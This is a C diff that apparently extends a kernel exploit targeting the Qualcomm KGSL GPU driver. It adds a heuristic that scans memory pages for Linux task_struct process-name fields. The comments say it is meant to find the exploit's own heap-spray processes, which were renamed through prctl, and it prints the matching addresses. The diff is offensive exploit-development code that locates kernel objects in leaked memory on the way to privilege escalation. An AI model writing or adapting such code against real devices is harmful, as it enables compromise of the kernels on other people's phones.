@@ -837,6 +837,45 @@ int main(int argc, char **argv) {
                             }
                         }
                     }
+                    // 17. Comm-like field — 4-7 byte ASCII string followed
+                    //     by NUL padding within the next 8 bytes. This
+                    //     pattern matches ANY process comm field, not just
+                    //     known kernel comms. Catches our spray sleep
+                    //     processes whose comm was set to "KETO0422" /
+                    //     "KETW0NNN" / "sleep" via prctl, AND any
+                    //     arbitrary user process whose task_struct lands
+                    //     in KGSL range. Lower confidence (75) so we
+                    //     verify via comm_at_known_offset check.
+                    if (!found_sig) {
+                        const char *qc = (const char *)buf;
+                        for (int i = 0; i <= PAGE_SIZE - 16; i++) {
+                            // Need 4+ printable ASCII bytes in a row
+                            int run = 0, run_start = i;
+                            while (i < PAGE_SIZE && run < 16) {
+                                uint8_t c = qc[i];
+                                if (0x20 <= c && c <= 0x7e) {
+                                    run++; i++;
+                                } else break;
+                            }
+                            if (run >= 4) {
+                                // NUL padding: at least 4 NULs in the
+                                // next 12 bytes (typical for 16-byte
+                                // comm field with short process name).
+                                int nulls = 0;
+                                for (int j = 0; j < 12; j++) {
+                                    if (i + j >= PAGE_SIZE) break;
+                                    if (qc[i + j] == 0) nulls++;
+                                }
+                                if (nulls >= 4) {
+                                    found_sig = 17;
+                                    found_off = run_start;
+                                    break;
+                                }
+                            }
+                            // Skip ahead — don't restart inside the
+                            // run we just measured.
+                        }
+                    }
 
                     if (found_sig) {
                         printf("MATCH:%lx:%d:%d\n", (unsigned long)va, found_sig, found_off);
